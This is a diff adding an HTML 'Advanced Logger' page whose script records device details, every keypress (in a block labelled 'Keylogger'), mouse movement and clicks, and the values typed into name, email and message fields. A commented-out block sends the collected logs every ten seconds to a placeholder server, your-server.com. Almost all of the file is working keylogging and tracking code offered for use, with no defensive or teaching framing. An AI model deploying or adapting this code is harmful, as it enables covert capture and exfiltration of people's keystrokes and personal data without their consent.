@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Advanced Logger</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background: #f0f0f0;
+    }
+    textarea, input, select {
+      display: block;
+      margin-bottom: 10px;
+      padding: 8px;
+      width: 100%;
+      max-width: 400px;
+    }
+    #log {
+      white-space: pre-wrap;
+      background: #fff;
+      padding: 15px;
+      height: 300px;
+      overflow-y: scroll;
+      border: 1px solid #ccc;
+      margin-top: 20px;
+    }
+    h2 {
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Advanced Logger System</h2>
+
+<!-- Sample form fields to track -->
+<input type="text" id="name" name="name" placeholder="Your Name">
+<input type="email" id="email" name="email" placeholder="Email Address">
+<textarea id="message" name="message" placeholder="Type a message..."></textarea>
+<select id="gender" name="gender">
+  <option value="">Select Gender</option>
+  <option value="male">Male</option>
+  <option value="female">Female</option>
+</select>
+
+<div id="log"></div>
+
+<script>
+  const logContainer = document.getElementById('log');
+  const logs = [];
+
+  function addLog(message) {
+    const timestamp = new Date().toLocaleTimeString();
+    const entry = `[${timestamp}] ${message}`;
+    logs.push(entry);
+    logContainer.textContent += entry + '\n';
+    logContainer.scrollTop = logContainer.scrollHeight;
+    if (logs.length > 500) logs.shift(); // prevent overflow
+  }
+
+  // Device info
+  addLog("📱 Device Info:");
+  addLog("User Agent: " + navigator.userAgent);
+  addLog("Language: " + navigator.language);
+  addLog("Platform: " + navigator.platform);
+  addLog("Screen: " + screen.width + "x" + screen.height);
+  addLog("--------------");
+
+  // Keylogger
+  document.addEventListener('keydown', e => {
+    addLog(`🔑 Key Pressed: ${e.key}`);
+  });
+
+  // Mouse movement
+  document.addEventListener('mousemove', e => {
+    addLog(`🖱️ Mouse Move: X=${e.clientX}, Y=${e.clientY}`);
+  });
+
+  // Mouse click
+  document.addEventListener('click', e => {
+    addLog(`🖱️ Mouse Click at (${e.clientX}, ${e.clientY})`);
+  });
+
+  // Window focus/blur
+  window.addEventListener('focus', () => addLog('🟢 Window Focused'));
+  window.addEventListener('blur', () => addLog('🔴 Window Unfocused'));
+
+  // Form field change tracker
+  const inputs = document.querySelectorAll('input, textarea, select');
+  inputs.forEach(input => {
+    input.addEventListener('input', (e) => {
+      addLog(`✏️ Form [${e.target.name || e.target.id}] changed to: ${e.target.value}`);
+    });
+  });
+
+  // Optional: Send logs to server
+  /*
+  setInterval(() => {
+    fetch('https://your-server.com/logger-endpoint', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ sessionId: Date.now(), logs: logs })
+    }).then(() => {
+      addLog("📤 Logs sent to server.");
+      logs.length = 0;
+    }).catch(err => {
+      addLog("❌ Failed to send logs.");
+    });
+  }, 10000); // send every 10 seconds
+  */
+</script>
+
+</body>
+</html>
